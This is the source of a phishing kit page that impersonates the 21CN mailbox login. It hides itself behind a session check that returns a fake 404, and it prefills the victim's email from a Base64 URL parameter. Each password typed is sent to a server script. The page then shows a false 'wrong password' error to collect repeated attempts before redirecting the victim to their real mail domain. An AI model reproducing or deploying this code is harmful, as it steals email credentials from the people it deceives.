<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>21CN个人邮箱 - 天翼数字生活科技有限公司</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body>
    <div id="mainc21cn" style="height: 100vh;">
        <div id="navb21cn" class="c-div" style="height: 60px;background: rgba(255,255,255,0.51);padding-top: 13px;padding-bottom: 13px;padding-left: 16px;padding-right: 16px;margin-top: 100px;">
            <div style="max-width: 1420px;width: 100%;"><img class="img-fluid" width="130" height="50" src="../assets/img/21cnlg.png"></div>
        </div>
        <div id="m021cn" class="c-div">
            <div id="maino21cn" class="c-div" style="height: 460px;width: 100%;max-width: 1420px;">
                <div id="maini139" class="e-div" style="width: 100%;max-width: 1024px;">
                    <div id="fo263" style="width: 100%;max-width: 340px;background: #ffffff;height: fit-content;margin-top: 50px;">
                        <div style="padding: 0px 28px 26px;padding-top: 22px;"><img class="img-fluid" width="165" height="40" src="../assets/img/logo21cn.png" style="height: 20px;width: auto;"><input type="text" id="backEMF" style="width: 100%;height: 40px;padding: 1px 8px;font-size: 14px;margin-top: 8px;"><input type="password" id="pass" style="width: 100%;height: 40px;margin-top: 16px;padding: 1px 8px;font-size: 14px;" placeholder="密码">
                            <p id="err" style="margin-top: 6px;font-size: 14px;color: rgb(242,15,0);">密码错误，请重试</p><button class="btn btn-primary" id="next-btn" type="button" style="width: 100%;height: 40px;border-radius: 0px;margin-top: 16px;" onclick="nextFun();">登 录</button>
                            <div class="sp-div" style="margin-top: 16px;font-size: 12px;">
                                <div class="form-check"><input class="form-check-input" type="checkbox" id="formCheck-1"><label class="form-check-label" for="formCheck-1"> 一周内自动登录</label></div><a href="#" style="color: rgb(0,0,0);">&nbsp;找回密码</a>
                            </div>
                            <div class="e-div" style="margin-top: 16px;font-size: 12px;"><a href="#" style="color: rgb(0,0,0);">帮助与反馈<br><br></a></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>